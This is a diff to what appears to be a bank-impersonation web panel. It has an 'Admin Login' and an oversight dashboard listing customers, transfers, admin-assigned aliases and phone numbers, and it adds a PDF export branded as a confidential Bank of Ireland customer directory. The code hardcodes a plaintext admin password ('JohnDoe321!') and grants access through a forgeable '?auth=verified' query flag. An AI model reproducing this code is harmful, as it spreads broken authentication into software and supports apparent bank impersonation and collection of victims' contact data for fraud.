@@ -3248,7 +3248,7 @@ No transfers found yet on your account.`;
     try {
       const { pin } = req.body;
       
-      if (pin === "270309200207") {
+      if (pin === "JohnDoe321!") {
         // Redirect with auth token in URL
         res.redirect('/admin-oversight?auth=verified');
       } else {
@@ -3332,7 +3332,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubunt
 .login-box p{color:#6c757d;font-size:15px;margin-bottom:28px;font-weight:500}
 .form-group{margin-bottom:20px}
 .form-group label{display:block;color:#495057;font-size:13px;font-weight:700;margin-bottom:8px}
-.form-group input{width:100%;padding:14px 16px;border:2px solid #e9ecef;border-radius:10px;font-size:18px;font-family:'SF Mono',Monaco,monospace;letter-spacing:3px;transition:all 0.3s ease;background:#fff}
+.form-group input{width:100%;padding:14px 16px;border:2px solid #e9ecef;border-radius:10px;font-size:16px;transition:all 0.3s ease;background:#fff}
 .form-group input:focus{outline:none;border-color:#2a5298;box-shadow:0 0 0 4px rgba(42,82,152,0.1)}
 .btn-login{width:100%;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:#fff;border:none;padding:16px;border-radius:12px;font-size:17px;font-weight:700;cursor:pointer;transition:all 0.3s ease;box-shadow:0 4px 15px rgba(30,60,114,0.3)}
 .btn-login:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(30,60,114,0.4)}
@@ -3344,12 +3344,12 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubunt
 <body>
 <div class="login-box">
 <h1>Admin Login</h1>
-<p>Enter PIN to access oversight</p>
-${hasError ? '<div class="error show">Invalid PIN. Please try again.</div>' : ''}
+<p>Enter password to access oversight</p>
+${hasError ? '<div class="error show">Invalid password. Please try again.</div>' : ''}
 <form action="/api/admin/login" method="POST">
 <div class="form-group">
-<label>PIN Code</label>
-<input type="text" name="pin" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required autofocus>
+<label>Password</label>
+<input type="password" name="pin" autocomplete="current-password" required autofocus>
 </div>
 <button type="submit" class="btn-login">Login</button>
 </form>
@@ -3367,6 +3367,7 @@ ${hasError ? '<div class="error show">Invalid PIN. Please try again.</div>' : ''
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="mobile-web-app-capable" content="yes">
 <title>Admin Dashboard</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a14;overflow:hidden;width:100vw;height:100vh;display:flex;flex-direction:column;color:#fff}
@@ -3510,7 +3511,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <button class="ctrl-btn" onclick="setSort('number',this)">Number</button>
 <button class="ctrl-btn" onclick="setSort('date',this)">Date</button>
 <button class="ctrl-btn" onclick="setSort('activity',this)">Most Active</button>
-<button class="ctrl-btn" onclick="exportData()">Export</button>
+<button class="ctrl-btn" onclick="exportData()">Export CSV</button>
+<button class="ctrl-btn" onclick="generateCustomerListPDF()" style="background:rgba(26,84,144,0.2);color:#5b9bd5;border-color:rgba(26,84,144,0.4)">Customer List PDF</button>
 </div>
 <div class="srch">
 <input type="text" id="srch" placeholder="Search by name, alias, or customer number..." oninput="flt()" onfocus="pauseRefresh()" onblur="resumeRefresh()">
@@ -3831,6 +3833,117 @@ a.href=url;
 a.download='customers_'+new Date().toISOString().split('T')[0]+'.csv';
 a.click();
 URL.revokeObjectURL(url);
+}
+function generateCustomerListPDF(){
+const eligible=allCust.filter(c=>c.adminAlias&&c.adminAlias.trim()&&c.adminPhone&&c.adminPhone.trim()&&!c.deletedAt);
+if(eligible.length===0){alert('No customers found with both an alias and phone number saved.');return;}
+const {jsPDF}=window.jspdf;
+const doc=new jsPDF({orientation:'portrait',unit:'mm',format:'a4'});
+const pageW=210;const pageH=297;const margin=20;const usableW=pageW-margin*2;
+// Header background
+doc.setFillColor(26,84,144);
+doc.rect(0,0,pageW,40,'F');
+// BOI logo text
+doc.setTextColor(255,255,255);
+doc.setFont('helvetica','bold');
+doc.setFontSize(22);
+doc.text('Bank of Ireland',margin,18);
+doc.setFontSize(11);
+doc.setFont('helvetica','normal');
+doc.text('Internal Customer Directory',margin,27);
+// Title
+doc.setFontSize(28);
+doc.setFont('helvetica','bold');
+doc.setTextColor(255,255,255);
+doc.text('BOI Customers',pageW-margin,22,{align:'right'});
+// Date line
+const today=new Date().toLocaleDateString('en-IE',{day:'2-digit',month:'long',year:'numeric'});
+doc.setFontSize(9);
+doc.setFont('helvetica','normal');
+doc.setTextColor(180,210,240);
+doc.text('Generated: '+today,pageW-margin,30,{align:'right'});
+// Divider
+doc.setDrawColor(26,84,144);
+doc.setLineWidth(0.5);
+doc.line(margin,44,pageW-margin,44);
+// Subtitle
+doc.setFontSize(10);
+doc.setFont('helvetica','italic');
+doc.setTextColor(100,100,120);
+doc.text('Showing '+eligible.length+' customer'+(eligible.length!==1?'s':'')+' with alias and phone on record',margin,51);
+let y=60;let page=1;
+eligible.forEach((c,i)=>{
+if(y>pageH-30){
+doc.addPage();
+page++;
+// Page header stripe
+doc.setFillColor(26,84,144);
+doc.rect(0,0,pageW,12,'F');
+doc.setTextColor(255,255,255);
+doc.setFontSize(8);
+doc.setFont('helvetica','bold');
+doc.text('BOI Customers — Internal Directory',margin,8);
+doc.text('Page '+page,pageW-margin,8,{align:'right'});
+doc.setDrawColor(200,210,230);
+doc.setLineWidth(0.3);
+doc.line(margin,14,pageW-margin,14);
+y=22;
+}
+// Card background (alternating)
+if(i%2===0){doc.setFillColor(247,250,255);}else{doc.setFillColor(255,255,255);}
+doc.roundedRect(margin,y-4,usableW,20,2,2,'F');
+doc.setDrawColor(210,225,245);
+doc.setLineWidth(0.3);
+doc.roundedRect(margin,y-4,usableW,20,2,2,'S');
+// Left accent bar
+doc.setFillColor(26,84,144);
+doc.rect(margin,y-4,3,20,'F');
+// Number badge
+doc.setFillColor(240,245,255);
+doc.setDrawColor(190,215,240);
+doc.setLineWidth(0.2);
+doc.roundedRect(margin+8,y-1,16,7,1,1,'FD');
+doc.setFontSize(7);
+doc.setFont('helvetica','bold');
+doc.setTextColor(26,84,144);
+doc.text(String(i+1),margin+16,y+4,{align:'center'});
+// Alias name
+doc.setFontSize(13);
+doc.setFont('helvetica','bold');
+doc.setTextColor(20,40,80);
+doc.text(c.adminAlias.trim(),margin+28,y+5);
+// Customer number
+doc.setFontSize(9);
+doc.setFont('helvetica','normal');
+doc.setTextColor(100,120,160);
+doc.text('No. '+c.customerNumber,margin+28,y+11);
+// Phone
+doc.setFontSize(9);
+doc.setFont('helvetica','bold');
+doc.setTextColor(26,120,80);
+doc.text(c.adminPhone.trim(),pageW-margin-4,y+5,{align:'right'});
+doc.setFontSize(7);
+doc.setFont('helvetica','normal');
+doc.setTextColor(140,160,180);
+doc.text('Phone',pageW-margin-4,y+11,{align:'right'});
+y+=24;
+});
+// Footer on last page
+const totalPages=doc.getNumberOfPages();
+for(let p=1;p<=totalPages;p++){
+doc.setPage(p);
+doc.setFillColor(245,248,252);
+doc.rect(0,pageH-10,pageW,10,'F');
+doc.setDrawColor(200,215,235);
+doc.setLineWidth(0.3);
+doc.line(margin,pageH-10,pageW-margin,pageH-10);
+doc.setFontSize(7);
+doc.setFont('helvetica','normal');
+doc.setTextColor(140,155,175);
+doc.text('CONFIDENTIAL — Bank of Ireland Internal Use Only',margin,pageH-4);
+doc.text('Page '+p+' of '+totalPages,pageW-margin,pageH-4,{align:'right'});
+}
+doc.save('BOI_Customers_'+new Date().toISOString().split('T')[0]+'.pdf');
 }
 async function logout(){
 try{await fetch('/api/admin/logout',{method:'POST'});window.location.href='/admin-oversight'}catch(e){alert('Error')}
